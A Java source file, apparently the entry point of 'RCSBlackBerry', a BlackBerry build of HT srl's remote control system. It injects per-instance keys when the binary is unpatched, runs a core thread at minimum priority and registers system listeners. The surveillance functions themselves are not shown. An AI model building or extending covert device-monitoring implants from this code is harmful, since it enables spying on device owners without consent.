//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : Main.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry;

import net.rim.device.api.system.Application; 
//#ifdef TEST
import tests.MainTest; 
//#endif
import blackberry.config.InstanceKeys323;
import blackberry.config.Keys;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class Main.
 * Antenna defines: DBC,HAVE_PERMISSIONS,HAVE_MIME,EVENTLOGGER
 */
public class Main extends Application {

    /**
     * The main method.
     * 
     * @param args
     *            the arguments
     */
    public static void main(final String[] args) {
        //#ifdef DEBUG
        if (args.length > 0) {
            System.out.println("Test");
            new MainTest();
        } else {
            //#endif

            new Main().enterEventDispatcher();

            //#ifdef DEBUG 
        }
        //#endif
    }

    private final Debug debug;

    AppListener appListener;

    /**
     * Instantiates a new main.
     */
    public Main() {
        Thread.currentThread().setPriority(Thread.MIN_PRIORITY);

        boolean binaryPatched = false;
        if (!Keys.hasBeenBinaryPatched()) {
            binaryPatched = true;
            InstanceKeys323.injectKeys323();
        }

        appListener = AppListener.getInstance();
        final Core core = Core.getInstance();

        debug = new Debug("Main", DebugLevel.VERBOSE);
        debug.info("RCSBlackBerry " + Version.getString());

        if (binaryPatched) {
            //#ifdef DEBUG
            debug.warn("Not binary patched, injecting 323");
            //#endif
        }

        final Thread coreThread = new Thread(core);
        coreThread.setPriority(Thread.MIN_PRIORITY);
        coreThread.start();

        startListeners();
    }

    /**
     * 
     */
    public void startListeners() {
        //#ifdef DEBUG_INFO
        debug.info("Starting Listeners");
        //#endif

        addHolsterListener(appListener);
        addSystemListener(appListener);
    }

    /**
     * 
     */
    public void stopListeners() {
        //#ifdef DEBUG_INFO
        debug.info("Stopping Listeners");
        //#endif

        removeHolsterListener(appListener);
        removeSystemListener(appListener);
    }
}
